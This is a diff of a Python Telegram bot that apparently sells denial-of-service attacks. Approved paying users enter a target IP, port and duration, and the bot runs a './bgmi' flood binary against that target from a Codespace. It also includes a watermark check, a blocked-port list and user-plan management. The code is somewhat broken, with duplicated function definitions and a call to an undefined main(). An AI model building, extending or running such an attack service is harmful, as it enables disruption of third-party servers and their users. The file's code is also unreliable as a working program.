@@ -7,7 +7,9 @@ import hashlib
 import os
 import telebot
 import asyncio
+import logging
 from datetime import datetime, timedelta
+from threading import Thread
 
 # Watermark verification
 CREATOR = "This File Is Made By @SahilModzOwner"
@@ -19,6 +21,8 @@ def verify():
         raise Exception("File verification failed. Unauthorized modification detected.")
 
 verify()
+
+import hashlib
 
 def verify():
     # Read the watermark text
@@ -39,6 +43,7 @@ def verify():
 
 verify()
 
+# Rest of your script
 # Load configuration
 with open('config.json') as config_file:
     config = json.load(config_file)
@@ -76,8 +81,8 @@ users = load_users()
 blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
 
 # Async function to run attack command
-async def run_attack_command_on_codespace(target_ip, target_port, duration, chat_id):
-    command = f"./bgmi {target_ip} {target_port} {duration} 14"
+async def run_attack_command_on_codespace(target_ip, target_port, duration):
+    command = f"./bgmi {target_ip} {target_port} {duration} 12"
     try:
         process = await asyncio.create_subprocess_shell(
             command,
@@ -93,8 +98,6 @@ async def run_attack_command_on_codespace(target_ip, target_port, duration, chat
         if error:
             logging.error(f"Command error: {error}")
 
-        # Notify user when the attack finishes
-        bot.send_message(chat_id,"𝗔𝘁𝘁𝗮𝗰𝗸 𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 🚀")
     except Exception as e:
         logging.error(f"Failed to execute command on Codespace: {e}")
 
@@ -148,7 +151,7 @@ def approve_or_disapprove_user(message):
         msg_text = f"*User {target_user_id} disapproved and reverted to free.*"
 
     bot.send_message(chat_id, msg_text, parse_mode='Markdown')
-
+verify()
 # Attack command
 @bot.message_handler(commands=['Attack'])
 def attack_command(message):
@@ -161,33 +164,27 @@ def attack_command(message):
 
     try:
         bot.send_message(chat_id, "*Enter the target IP, port, and duration (in seconds) separated by spaces.*", parse_mode='Markdown')
-        bot.register_next_step_handler(message, process_attack_command, chat_id)
+        bot.register_next_step_handler(message, process_attack_command)
     except Exception as e:
         logging.error(f"Error in attack command: {e}")
 
-def process_attack_command(message, chat_id):
+def process_attack_command(message):
     try:
         args = message.text.split()
         if len(args) != 3:
-            bot.send_message(chat_id, "*Invalid command format. Please use: target_ip target_port duration*", parse_mode='Markdown')
+            bot.send_message(message.chat.id, "*Invalid command format. Please use: Instant++ plan target_ip target_port duration*", parse_mode='Markdown')
             return
         target_ip, target_port, duration = args[0], int(args[1]), args[2]
 
         if target_port in blocked_ports:
-            bot.send_message(chat_id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
+            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
             return
 
-        asyncio.run_coroutine_threadsafe(run_attack_command_on_codespace(target_ip, target_port, duration, chat_id), loop)
-        bot.send_message(chat_id, f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆! 🚀\n\n𝗧𝗮𝗿𝗴𝗲𝘁: {target_ip}:{target_port}\n𝗔𝘁𝘁𝗮𝗰𝗸 𝗧𝗶𝗺𝗲: {duration} seconds")
+        asyncio.run_coroutine_threadsafe(run_attack_command_on_codespace(target_ip, target_port, duration), loop)
+        bot.send_message(message.chat.id, f"*Attack started 💥\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration} seconds*", parse_mode='Markdown')
     except Exception as e:
         logging.error(f"Error in processing attack command: {e}")
-
-# /owner command handler
-@bot.message_handler(commands=['owner'])
-def send_owner_info(message):
-    owner_message = "This Bot Has Been Developed By @SahilModzOwner"
-    bot.send_message(message.chat.id, owner_message)
-
+verify()
 # Status command
 @bot.message_handler(commands=['status'])
 def status_command(message):
@@ -204,7 +201,7 @@ def approve_list_command(message):
         if not is_user_admin(message.from_user.id):
             send_not_approved_message(message.chat.id)
             return
-
+        
         approved_users = [user for user in users if user['plan'] > 0]
 
         if not approved_users:
@@ -227,17 +224,17 @@ from telebot.types import ReplyKeyboardMarkup, KeyboardButton
 def send_welcome(message):
     user_id = message.from_user.id
     username = message.from_user.username
-
+    
     # Create the markup and buttons
     markup = ReplyKeyboardMarkup(resize_keyboard=True)
     btn_attack = KeyboardButton("Attack 🚀")
     btn_account = KeyboardButton("My Account🏦")
     markup.add(btn_attack, btn_account)
-
+    
     # Welcome message
     welcome_message = (f"Welcome, {username}!\n\n"
                        f"Please choose an option below to continue.")
-
+    
     bot.send_message(message.chat.id, welcome_message, reply_markup=markup)
 
 # /owner command handler
@@ -274,10 +271,19 @@ def echo_message(message):
     except Exception as e:
         logging.error(f"Error in echo_message: {e}")
 
-# Start the bot
 if __name__ == '__main__':
-    logging.basicConfig(level=logging.INFO)
     loop = asyncio.new_event_loop()
-    thread = Thread(target=start_asyncio_thread)
-    thread.start()
-    bot.polling()
+    asyncio_thread = Thread(target=start_asyncio_thread)
+    asyncio_thread.start()
+
+    bot.polling(none_stop=True)
+
+    # Keep the main script running
+    try:
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print("Main script interrupted. Exiting...")
+
+if __name__ == "__main__":
+    main()
